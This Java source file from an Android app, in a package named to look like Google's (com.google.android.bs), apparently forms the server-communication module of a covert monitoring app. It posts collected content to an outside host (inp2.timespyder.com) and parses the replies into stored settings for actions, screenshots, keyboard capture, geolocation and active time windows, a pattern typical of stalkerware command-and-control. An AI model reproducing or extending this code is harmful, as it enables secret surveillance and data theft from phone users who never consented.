package com.google.android.bs;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import com.google.android.history.LinkService;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Log;

public class Request {
	private final String LOG_TAG = "request";
	Context context;

	public Request(Context context) {
		this.context = context;
	}

	private int sendPostRequest(String postRequest) {
		// Создадим HttpClient и PostHandler
		HttpClient httpclient = new DefaultHttpClient();
		HttpPost httppost = new HttpPost("http://inp2.timespyder.com");

		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);

		Log.d("request", postRequest);

		nameValuePairs.add(new BasicNameValuePair("content", postRequest));

		try {
			httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs,
					"cp1251"));

			Log.d(LOG_TAG, "1 - " + EntityUtils.toString(httppost.getEntity()));

			// Выполним запрос
			HttpResponse response = httpclient.execute(httppost);

			String strData = EntityUtils.toString(response.getEntity());
			Log.d(LOG_TAG, "2 - " + strData);

			// getResponseData(strData);

		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		return 0;
	}

	private int sendFirstPostRequest(String postRequest) {
		// Создадим HttpClient и PostHandler
		HttpClient httpclient = new DefaultHttpClient();
		HttpPost httppost = new HttpPost("http://inp2.timespyder.com");

		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);

		Log.d(LOG_TAG, "request:" + postRequest);

		nameValuePairs.add(new BasicNameValuePair("content", postRequest));

		try {
			httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs,
					"cp1251"));

			Log.d(LOG_TAG, "3 - " + EntityUtils.toString(httppost.getEntity()));

			// Выполним запрос
			HttpResponse response = httpclient.execute(httppost);

			String strData = EntityUtils.toString(response.getEntity());
			Log.d(LOG_TAG, "4 - " + strData);

			getResponseData(strData);

		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		return 0;
	}

	private void getResponseData(String string) {
		// TODO Auto-generated method stub

		Log.d(LOG_TAG, "getResponseData: " + string);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(context);
		Editor ed = sp.edit();

		Pattern pattern = Pattern.compile("<ANSWER>(.+?)</ANSWER>");
		Matcher matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "ANSWER: " + matcher.group(1));
		} else {
			Log.d(LOG_TAG, "ANSWER: null");
		}

		pattern = Pattern.compile("<ACTION>(.+?)</ACTION>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "ACTION: " + matcher.group(1));
			ed.putString("ACTION", matcher.group(1));
		} else {
			Log.d(LOG_TAG,  "ACTION: null");
			ed.putString("ACTION", "");
		}

		pattern = Pattern.compile("<ID>(.+?)</ID>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, matcher.group(1));
			ed.putString("ID", "ID: " + matcher.group(1));
		} else {
			Log.d(LOG_TAG, "ID: null");
			ed.putString("ID", "");
		}

		pattern = Pattern.compile("<NAME>(.+?)</NAME>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "NAME: " + matcher.group(1));
			ed.putString("NAME", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "NAME: null");
			ed.putString("NAME", "");
		}

		pattern = Pattern.compile("<SCR>(.+?)</SCR>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, matcher.group(1));
			ed.putString("SCR", "SCR: " + matcher.group(1));
		} else {
			Log.d(LOG_TAG, "SCR: null");
			ed.putString("SCR", "");
		}

		pattern = Pattern.compile("<KBD>(.+?)</KBD>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "KBD: " + matcher.group(1));
			ed.putString("KBD", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "KBD: null");
			ed.putString("KBD", "1");
		}

		pattern = Pattern.compile("<GEO>(.+?)</GEO>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "GEO: " + matcher.group(1));
			ed.putString("GEO", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "GEO: null");
			ed.putString("GEO", "5");
		}

		pattern = Pattern.compile("<GEOMET>(.+?)</GEOMET>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, matcher.group(1));
			ed.putString("GEOMET", "GEOMET:" + matcher.group(1));
		} else {
			Log.d(LOG_TAG, "GEOMET: null");
			ed.putString("GEOMET", "");
		}

		pattern = Pattern.compile("<UTCT>(.+?)</UTCT>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, matcher.group(1));
			ed.putString("UTCT", "UTCT:" + matcher.group(1));
		} else {
			Log.d(LOG_TAG, "UTCT: null");
			ed.putString("UTCT", "");
		}

		pattern = Pattern.compile("<TIME_FR>(.+?)</TIME_FR>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "TIME_FR: " + matcher.group(1));
			ed.putString("TIME_FR", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "TIME_FR: null");
			ed.putString("TIME_FR", "");
		}

		pattern = Pattern.compile("<TIME_TO>(.+?)</TIME_TO>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "TIME_TO: " + matcher.group(1));
			ed.putString("TIME_TO", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "TIME_TO: null");
			ed.putString("TIME_TO", "");
		}

		pattern = Pattern.compile("<BRK1_FR>(.+?)</BRK1_FR>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "BRK1_FR: " + matcher.group(1));
			ed.putString("BRK1_FR", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "BRK1_FR: null");
			ed.putString("BRK1_FR", "");
		}

		pattern = Pattern.compile("<BRK1_TO>(.+?)</BRK1_TO>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, "BRK1_TO:" + matcher.group(1));
			ed.putString("BRK1_TO", matcher.group(1));
		} else {
			Log.d(LOG_TAG, "BRK1_TO: null");
			ed.putString("BRK1_TO", "");
		}

		pattern = Pattern.compile("<GMT>(.+?)</GMT>");
		matcher = pattern.matcher(string);
		if (matcher.find()) {
			Log.d(LOG_TAG, matcher.group(1));
			ed.putString("GMT", "GMT: " + matcher.group(1));
		} else {
			Log.d(LOG_TAG, "GMT: null");
			ed.putString("GMT", "");
		}

		ed.commit();
	}

	public void sendRequest(String str) {
		RequestTask mt = new RequestTask();
		mt.execute(str);
	}

	public void sendFirstRequest(String str) {
		FirstRequestTask frt = new FirstRequestTask();
		frt.execute(str);
	}

	class FirstRequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();

		}

		@Override
		protected Void doInBackground(String... strs) {
			sendFirstPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	class RequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();

		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}
}
